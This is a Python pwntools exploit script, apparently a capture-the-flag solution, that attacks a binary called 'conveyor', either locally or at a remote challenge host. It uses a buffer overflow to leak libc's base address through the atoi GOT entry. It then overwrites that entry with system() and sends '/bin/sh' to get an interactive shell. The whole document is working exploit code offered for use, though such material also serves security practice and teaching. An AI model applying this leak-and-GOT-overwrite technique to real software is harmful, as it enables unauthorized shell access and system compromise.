from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './conveyor'
HOST = 'jh2i.com'
PORT = 50020

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


r = start()
if args.D:
    debug(r, [0x8f1])

r.sendlineafter('> ', '1')
r.sendlineafter('name: ', 'A')


r.sendlineafter('> ', '2')
r.sendlineafter('safe? ', 'N')
r.sendafter('alternative: ', 'A'*0x78+p64(elf.got.atoi))
r.recvuntil('part:\n')
leak = u64(r.recvuntil('\n')[:-1]+'\x00'*2)
dbg('leak')

base = leak - 0x00040680
dbg('base')
system = base + 0x4f440
binsh = base + 0x1b3e9a

r.sendlineafter('safe? ', 'N')
r.sendlineafter('alternative: ', p64(system))
r.sendlineafter('> ', '/bin/sh\x00')

r.interactive()
r.close()
